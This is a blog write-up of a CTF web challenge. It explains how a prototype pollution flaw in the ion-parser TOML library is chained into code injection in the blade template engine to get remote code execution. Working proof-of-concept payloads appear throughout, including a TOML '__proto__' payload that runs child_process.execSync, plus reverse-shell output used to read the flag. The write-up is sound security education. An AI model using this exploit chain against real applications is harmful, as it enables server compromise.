---
layout: post
title: STACK the flags 2020 CTF - Final Countdown
modified:
categories: blog/
excerpt: "Prototype pollution leading to remote code execution"
tags: []
image:
  feature:
share: true
comments: true
date: 2020-12-12T22:03:41+08:00
---

This challenge was part of the STACK the flags 2020 CTF organized by GovTech. I solved this challenge after the CTF was over as it wasn't available to us during the CTF.

This is a pretty interesting challenge that requires exploiting a prototype pollution vulnerability in a library (ion-parser) in order to manipulate another library (blade) in order to achieve remote code execution.

# Final Countdown
**Category:** Web 

[Source Code]({{site.url|append: site.baseurl}}/resources/files/stack/final_countdown.zip)  
**sha265**: 23fe6d930ad391511e6d2ad1987d9d0531be88705711caaea9efe2efa6da5923

---

A quick glance at the provided source code tells us that this is a web application written in NodeJS. Looking at `app.js`, we find routers being defined for the web application.

>app.js
{:.filename}
{% highlight javascript linenos %}
...

app.use('/', indexRouter);
app.use('/ransomware', ransomwaresRouter);
app.use('/victim', victimsRouter);
app.use('/ransom', ransomsRouter);

...
{% endhighlight %}

Looking through the other JavaScript code, we can learn that this appears to be a ransomware dashboard detailing any collected ransom(s), the victim(s) and details on any deployed ransomware(s), one interesting observation is that you can export the data in the TOML format (Tom's Obvious, Minimal Language) which looks similar to YAML.

Performing a quick audit of the entire source code, we don't find any obvious vulnerability in any of the defined routes, however, there is a particular route in `ransomwares.js` that appears to be incomplete and more importantly, passes unsanitized user input into a TOML parser (ion-parser).

>ransomwares.js
{:.filename}
{% highlight javascript linenos %}
router.post('/:id/config', upload.single('config'), async function (req, res) {
  try {
    var config = parse(req.file.buffer.toString());
    // await Ransomware.update(config, { where: { id: req.params.id } })  // database locked for maintenance
    res.redirect('/ransomware/' + req.params.id);

  } catch {
    res.sendStatus(500)
  }
});
{% endhighlight %}

### ion-parser library
A quick look up on [ion-parser](https://www.npmjs.com/package/ion-parser) shows that this library hasn't been updated in over a year and the GitHub repository no longer exists.

Looking at some sample TOML data, I hypothesize that it might be possible for a prototype pollution vulnerability to exist in the library and we can quickly verify that with the following NodeJS code:

{% highlight javascript linenos %}
const { parse } = require('ion-parser')

console.log("Before:", ({}).somevar)

const config = parse(`
[__proto__]
somevar = 'this is prototype pollution!'
`)

console.log("After:", ({}).somevar)%
{% endhighlight %}

Running gives us the following output:

{% highlight bash linenos %}
→ node sample.js
Before: undefined
After: this is prototype pollution!
{% endhighlight %}

Running the above code shows that we have managed to inject properties into `Object.prototype`, which most objects inherits from.

You can read more about prototype pollution [here](https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications).

Looking at the source code for ion-parser, we can find multiple places where prototype pollution could occur, but I'll leave this as an exercise for the reader.

### Achieving Remote Code Execution
> So now that we have prototype pollution, how do we escalate this into remote code execution (RCE)?

Prototype pollution allows us to inject properties into objects, and so if we are able to control values of a property that is then used in a dangerous function like `eval` or `exec`, we would be able to abuse that in order to achieve RCE.

![]({{site.url|append: site.baseurl}}/resources/images/stack/ast.png)
*Image from https://blog.p6.is/AST-Injection/*

Template engines like **handlebars**, **pug** makes good targets as they often have phases where templates are parsed into abstract syntax tree (AST) before being compiled and executed. Therefore, if we are able to influence the AST, we would be able to achieve RCE when it is executed.

POSIX has a great blog post on AST injection for **handlebars** and **pug**, you can read more about it [here](https://blog.p6.is/AST-Injection/).

In this CTF challenge, the [blade](https://github.com/bminer/node-blade) template engine is used by the web application to render HTML output.

Let's start by looking at a simple example and observe what is going on. Notice I set `debug` to `true` in order to get more information.

{% highlight javascript linenos %}
const blade = require('blade');

const template = `html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool`;
blade.compile(template, {'debug': true}, function(err, tmpl) {
});
{% endhighlight %}

Running this gave us the following output:
{% highlight bash linenos %}
→ node sample.js
Compiling:
html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool
---------------------------------------------
AST:
 {
  doctypes: [],
  nodes: [
    {
      type: 'tag',
      name: 'html',
      id: null,
      classes: [],
      attributes: {},
      children: [
        ** truncated **
                            {
                              type: 'tag',
                              name: 'a',
                              id: null,
                              classes: [],
                              attributes: { href: [Object] },
                              children: [ [Object] ],
                              line: 9,
                              col: 25
                            }
        ** truncated **
      ],
      line: 1,
      col: 1
    }
  ]
}
---------------------------------------------
Template:
__ = __ || [];__.r = __.r || blade.Runtime;if(!__.func) __.func = {},__.blocks = {},__.chunk = {};__.locals = locals || {};
try {with(__.locals) {__.line=1,__.col=1;__.push('<html'+'>');__.line=2,__.col=5;__.push('<head'+'>');__.line=3,__.col=9;__.push('<title'+'>'+"Blade"+'</title>'+'</head>');__.line=4,__.col=5;__.push('<body'+'>');__.line=5,__.col=9;__.push('<div'+' id="nav"'+'>');__.line=6,__.col=13;__.push('<ul'+'>');__.line=7,__.col=17;for(var i in nav)
{__.line=8,__.col=21;__.push('<li'+'>');__.line=9,__.col=25;__.push('<a');__.r.attrs({"href":{v:nav[i],e:1}}, __);__.push('>'+__.r.escape(i
)+'</a>'+'</li>');}__.push('</ul>'+'</div>');__.line=10,__.col=9;__.push('<div'+' id="content"'+' class="center"'+'>');__.line=11,__.col=13;__.push('<h1'+'>'+"Blade is cool"+'</h1>'+'</div>'+'</body>'+'</html>');}} catch(e){return cb(__.r.rethrow(e, __) );}if(!__.inc) __.r.done(__);cb(null, __.join(""), __);
---------------------------------------------
{% endhighlight %}

The debug information shows us the AST and the template code after compilation, from here, the goal is straightforward: ***we need to influence the process such that we are able to inject arbitrary code into the final compiled template***.

I started by running the same sample code, but with prototype pollution, in order to begin testing the effects it has on the compilation process. 

{% highlight javascript linenos %}
const blade = require('blade');

Object.prototype.someprop = {'test': 'test'};

const template = `html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool`;
blade.compile(template, {'debug': true}, function(err, tmpl) {
    console.log(err);
});
{% endhighlight %}

This time, the compilation process failed and we are provided a non-null error:
{% highlight bash linenos %}
---------------------------------------------
AST:
 {
  doctypes: [],
  nodes: [
    {
      type: 'tag',
      name: 'html',
      id: null,
      classes: [],
      attributes: {},
      children: [
        ** truncated **
                            {
                              type: 'tag',
                              name: 'a',
                              id: null,
                              classes: [],
                              attributes: { href: [Object], undefined: undefined },
                              children: [ [Object] ],
                              line: 9,
                              col: 25
                            }
        ** truncated **
      ],
      line: 1,
      col: 1
    }
  ]
}
---------------------------------------------
TypeError: Compile error: Cannot read property 'text' of undefined
    at <anonymous>


    at Compiler._compileNode (/source/node_modules/blade/lib/compiler.js:309:17)
    at Compiler._compileNode (/source/node_modules/blade/lib/compiler.js:356:12)
    at Compiler._compileNode (/source/node_modules/blade/lib/compiler.js:486:11)
    at Compiler._compileNode (/source/node_modules/blade/lib/compiler.js:356:12)
    at Compiler._compileNode (/source/node_modules/blade/lib/compiler.js:356:12)
    at Compiler._compileNode (/source/node_modules/blade/lib/compiler.js:356:12)
    at Compiler._compileNode (/source/node_modules/blade/lib/compiler.js:356:12)
    at Compiler.compile (/source/node_modules/blade/lib/compiler.js:114:9)
    at Object.compile (/source/node_modules/blade/lib/blade.js:57:12)
    at Object.<anonymous> (/source/sample.js:16:7) {
  source: 'html\n' +
    '    head\n' +
    '        title Blade\n' +
    '    body\n' +
    '        #nav\n' +
    '            ul\n' +
    '                - for(var i in nav)\n' +
    '                    li\n' +
    '                        a(href=nav[i])= i\n' +
    '        #content.center\n' +
    '            h1 Blade is cool',
  column: undefined,
  lastFilename: undefined,
  filename: undefined,
  line: undefined
}
{% endhighlight %}

Compared to the previous AST, notice that in this AST, the `a` node has an additional `undefined` attribute, possibly due to the prototype pollution.

From here, we begin diving into the source code for **blade**, in order to figure out why the error was occurring, this lead me to the following code within the parser module for **blade**:

>blade/lib/parser/index.js
{:.filename}
{% highlight javascript linenos %}
** truncated **
            result0 = (function(offset, line, column, first_attr, next_attrs) {
                    var attrs = {};
                    attrs[first_attr.name] = first_attr.value;
                    for(var i in next_attrs) 
                        attrs[next_attrs[i].name] = next_attrs[i].value;
                    return attrs;
                })(pos0.offset, pos0.line, pos0.column, result0[3], result0[4]);
** truncated **
{% endhighlight %}

So it seems like because `first_attr.name` is undefined and `first_attr.value` is undefined, we end up with the object in the AST above where we have an `undefined` property with `undefined` value.

This means, the following sample code with prototype pollution should allow us to successfully compile the template without any errors:

{% highlight javascript linenos %}
const blade = require('blade');

Object.prototype.someprop = {
    'test': 'test',
    'name': 'somename',
    'value': 'somevalue'
};

const template = `html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool`;
blade.compile(template, {'debug': true}, function(err, tmpl) {
    console.log(tmpl);
});
{% endhighlight %}

This gave us the following output

{% highlight bash linenos %}
AST:
 {
  doctypes: [],
  nodes: [
    {
      type: 'tag',
      name: 'html',
      id: null,
      classes: [],
      attributes: {},
      children: [
      ** truncated **
                            {
                              type: 'tag',
                              name: 'a',
                              id: null,
                              classes: [],
                              attributes: { href: [Object], somename: 'somevalue' },
                              children: [ [Object] ],
                              line: 9,
                              col: 25
                            }
        ** truncated **
      ],
      line: 1,
      col: 1
    }
  ]
}
---------------------------------------------
Template:
__ = __ || [];__.r = __.r || blade.Runtime;if(!__.func) __.func = {},__.blocks = {},__.chunk = {};__.locals = locals || {};
try {with(__.locals) {__.line=1,__.col=1;__.push('<html');__.r.attrs({"someprop":{v:undefined}}, __);__.push('>');__.line=2,__.col=5;__.push('<head');__.r.attrs({"someprop":{v:undefined}}, __);__.push('>');__.line=3,__.col=9;__.push('<title');__.r.attrs({"someprop":{v:undefined}}, __);__.push('>'+"Blade"+'</title>'+'</head>');__.line=4,__.col=5;__.push('<body');__.r.attrs({"someprop":{v:undefined}}, __);__.push('>');__.line=5,__.col=9;__.push('<div'+' id="nav"');__.r.attrs({"someprop":{v:undefined}}, __);__.push('>');__.line=6,__.col=13;__.push('<ul');__.r.attrs({"someprop":{v:undefined}}, __);__.push('>');__.line=7,__.col=17;for(var i in nav)
{__.line=8,__.col=21;__.push('<li');__.r.attrs({"someprop":{v:undefined}}, __);__.push('>');__.line=9,__.col=25;__.push('<a');__.r.attrs({"href":{v:nav[i],e:1},"somename":{v:undefined},"someprop":{v:undefined}}, __);__.push('>'+__.r.escape(i
)+'</a>'+'</li>');}__.push('</ul>'+'</div>');__.line=10,__.col=9;__.push('<div'+' id="content"'+' class="center"');__.r.attrs({"someprop":{v:undefined}}, __);__.push('>');__.line=11,__.col=13;__.push('<h1');__.r.attrs({"someprop":{v:undefined}}, __);__.push('>'+"Blade is cool"+'</h1>'+'</div>'+'</body>'+'</html>');}} catch(e){return cb(__.r.rethrow(e, __) );}if(!__.inc) __.r.done(__);cb(null, __.join(""), __);
---------------------------------------------
{% endhighlight %}

We can observe that `somename` is reflected in the compiled template, however, we were not able to escape the double-quote string context in order to inject arbitrary JavaScript. Therefore, the next step from here is to find a property that would allow us to inject arbitrary JavaScript code into the compiled template. ***Back to blade's source code..***

Looking at the compiler code for Blade, we can find this segment that handles the compiled template based on the attribute type:

>blade/lib/compiler.js
{:.filename}
{% highlight javascript linenos %}
** truncated **
                //take care of text attributes here
                if(attrs[i].text != null)
                {
                    if(attrs[i].escape)
                        this._push("' " + i + "=" + bladeutil.quote(
                            JSON.stringify(runtime.escape(attrs[i].text)) ) + "'");
                    else
                        this._push("' " + i + "=" + bladeutil.quote(
                            JSON.stringify(attrs[i].text) ) + "'");
                }
                //take care of code attributes here
                else
                    varAttrs += "," + JSON.stringify(i) + ":{v:" + attrs[i].code +
                        (attrs[i].escape ? ",e:1" : "") +
                        (i == "class" && attrs[i].append ?
                            ",a:" + JSON.stringify(attrs[i].append): "") + "}";
** truncated **
{% endhighlight %}

It seems like if we are able to inject a node with code attribute, we would be able to inject arbitrary JavaScript into the final compiled template and when executed in the runtime, give us RCE.

We can test this out by running the following:

{% highlight javascript linenos %}
const blade = require('blade');

Object.prototype.someprop = {
    'name': 'somename',
    'value': 'somevalue',
    'code' : "process.mainModule.require('child_process').execSync(`whoami`)"
};

const template = `html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool`;
blade.compile(template, {'debug': true}, function(err, tmpl) {
    tmpl({'nav': []}, function(err, html) {
        console.log(html, err);
    });
});
{% endhighlight %}

With that, we can combine our exploit for **ion-parser** and **blade**, to exploit the prototype pollution in **ion-parser** in order to inject into the AST for **blade** giving us RCE.

{% highlight javascript linenos %}
const blade = require('blade');
const { parse } = require('ion-parser')
const config = parse(`
test = 'Hey universe'

[__proto__.someprop]
name = "somename"
value = "somevalue"
code = "process.mainModule.require('child_process').execSync(\`whoami\`)"
`)

const template = `html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool`;
blade.compile(template, {'debug': true}, function(err, tmpl) {
    tmpl({'nav': []}, function(err, html) {
        console.log(html, err);
    });
});
{% endhighlight %}

### Getting the flag

With our exploit in hand, we can craft a HTTP request to the challenge website to get a reverse shell:

{% highlight bash linenos %}
Connection from node-02.challenges.stacks2020 35917 received!
→ ls
Dockerfile.dev
app.js
bin
config
flag.txt
migrations
models
node_modules
package-lock.json
package.json
public
routes
seeders
views
wait-for-db.sh
watcher.js
→ cat flag.txt
govtech-csg{P01lU+3d_t3Mpl@t3}
{% endhighlight %}

And we have our flag: ***govtech-csg{P01lU+3d_t3Mpl@t3}***
